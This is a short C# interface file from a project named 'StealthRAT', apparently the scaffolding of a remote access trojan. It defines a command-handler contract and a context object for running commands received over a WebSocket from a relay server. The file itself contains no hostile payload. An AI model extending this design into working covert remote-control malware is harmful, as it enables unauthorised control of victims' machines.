using System;
using System.Net.WebSockets;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace StealthRAT.Interfaces
{
    /// <summary>
    /// Defines a contract for handling specific remote commands received over the WebSocket.
    /// Each command type implements this interface following the Command pattern.
    /// </summary>
    public interface ICommandHandler
    {
        /// <summary>
        /// Gets the command keyword/action name that this handler responds to.
        /// </summary>
        string CommandName { get; }

        /// <summary>
        /// Executes the command with the parsed JSON element payload.
        /// </summary>
        /// <param name="payload">The JSON element containing arguments for the command.</param>
        /// <param name="context">The execution context providing socket access.</param>
        Task ExecuteAsync(JsonElement payload, CommandContext context);
    }

    /// <summary>
    /// Contextual information provided to handlers, including the WebSocket client 
    /// and a thread-safe helper for sending responses back to the server.
    /// </summary>
    public class CommandContext
    {
        /// <summary>
        /// The active WebSocket connection.
        /// </summary>
        public required ClientWebSocket WebSocket { get; init; }

        /// <summary>
        /// Cancellation token for cooperative shutdown.
        /// </summary>
        public required CancellationToken CancellationToken { get; init; }

        /// <summary>
        /// Thread-safe helper callback to transmit JSON text strings back to the relay server.
        /// </summary>
        public required Func<string, Task> SendTextResponseAsync { get; init; }
    }
}
